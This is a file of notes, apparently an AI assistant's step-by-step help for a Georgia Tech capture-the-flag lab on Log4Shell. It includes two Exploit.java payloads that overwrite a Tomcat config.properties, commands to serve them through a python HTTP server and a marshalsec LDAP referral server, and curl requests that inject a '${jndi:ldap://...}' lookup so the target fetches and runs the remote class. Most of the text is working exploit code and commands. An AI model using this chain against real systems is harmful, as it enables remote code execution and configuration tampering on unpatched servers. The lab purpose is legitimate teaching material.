@@ -1,0 +1,152 @@
+Current Progress and Next Steps
+What we've achieved so far:
+
+We've identified that to get Flag 5, we need to:
+
+Change the topic in config.properties from "user.info" to "user.account"
+Include your GATECH_ID (904074283) as the account number in the published message
+
+
+We've created an Exploit.java file that attempts to overwrite the config.properties file:
+javaCopyimport java.io.File;
+import java.io.FileOutputStream;
+import java.util.Properties;
+
+public class Exploit {
+    public Exploit() {
+        try {
+            Properties props = new Properties();
+            props.setProperty("customer.service.email", "customerservice@gatech.edu");
+            props.setProperty("topic.name", "user.account");
+            props.setProperty("rating", "PG");
+            
+            File file = new File("/opt/tomcat/webapps/ROOT/config.properties");
+            FileOutputStream fos = new FileOutputStream(file);
+            props.store(fos, null);
+            fos.close();
+            
+            System.out.println("Successfully overwritten config.properties to use user.account");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
+    public static void main(String[] args) {
+        new Exploit();
+    }
+}
+
+We've set up the HTTP and LDAP servers to deliver this exploit
+We've attempted various curl commands to trigger the Log4j exploit and pass your GATECH_ID
+
+The challenge we're facing:
+The config.properties file isn't being successfully overwritten, or the application isn't reading the updated file. We're still seeing messages going to "user.info" instead of "user.account".
+Next steps to get the flag:
+
+Restart the environment for a clean slate:
+Copy./StopContainer.sh
+./StartContainer.sh
+
+Restart both servers with our optimized Exploit.java:
+
+Make sure you're in the Flag5 directory
+Recompile: javac Exploit.java
+Start HTTP server: python3 -m http.server 8888
+Start LDAP server: java -cp ../marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:8888/#Exploit" 4444
+
+
+Try a modified curl command that focuses on including the GATECH_ID in multiple ways:
+Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"userName":"${jndi:ldap://172.17.0.1:4444/Exploit}", "accountNum":"904074283"}'
+
+Check the logs after running the curl command to see:
+
+If the LDAP server was contacted
+If the config.properties file was modified
+Which topic is being used for publishing
+
+
+Try a follow-up curl command to verify if the topic has changed:
+Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"accountNum":"904074283"}'
+
+
+If the flag still isn't coming through, we may need to look deeper at the exact pattern being used in the application for setting the account number.
+
+
+
+method 2 ---
+
+
+I see that we still have some challenges. Let's go back to our original approach but with a better understanding of what's going on:
+
+We need to change the topic from "user.info" to "user.account" in the config.properties file
+We need to make sure our GATECH_ID (904074283) is included as the account number
+
+Let's try a slightly different approach. Since the Log4j exploit seems to be working (the LDAP server is redirecting properly), but something is going wrong with updating the config.properties file, let's try a different Exploit.java file:
+Step 12: Update our Exploit.java file with a more targeted approach
+Copycd ~/Desktop/log4shell/Flag5
+Create a new Exploit.java file:
+javaCopyimport java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.util.Properties;
+
+public class Exploit {
+    public Exploit() {
+        try {
+            // Try multiple paths to cover all possibilities
+            String[] possiblePaths = {
+                "/opt/tomcat/webapps/ROOT/config.properties",
+                "/usr/local/tomcat/webapps/ROOT/config.properties",
+                "/usr/local/tomcat/config.properties",
+                "/opt/tomcat/config.properties",
+                "/config.properties"
+            };
+            
+            // Try each path
+            for (String path : possiblePaths) {
+                File file = new File(path);
+                if (file.exists()) {
+                    System.out.println("Found config.properties at: " + path);
+                    
+                    // Read existing properties
+                    Properties props = new Properties();
+                    FileInputStream fis = new FileInputStream(file);
+                    props.load(fis);
+                    fis.close();
+                    
+                    // Print current properties
+                    System.out.println("Current properties: " + props);
+                    
+                    // Update property
+                    props.setProperty("topic.name", "user.account");
+                    
+                    // Write back
+                    FileOutputStream fos = new FileOutputStream(file);
+                    props.store(fos, null);
+                    fos.close();
+                    
+                    System.out.println("Successfully updated config.properties to use user.account");
+                    break;
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
+    public static void main(String[] args) {
+        new Exploit();
+    }
+}
+Compile:
+Copyjavac Exploit.java
+Run the servers again (if they're not already running):
+Copy# In one terminal (make sure you're in the Flag5 directory):
+python3 -m http.server 8888
+
+# In another terminal (from the target directory):
+java -cp ../marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:8888/#Exploit" 4444
+Then trigger the exploit:
+Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"userName":"${jndi:ldap://172.17.0.1:4444/Exploit}", "accountNum":"904074283"}'
+After running this, try a follow-up curl command to see if we can trigger a message to the user.account topic:
+Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"userName":"user1", "accountNum":"904074283"}'
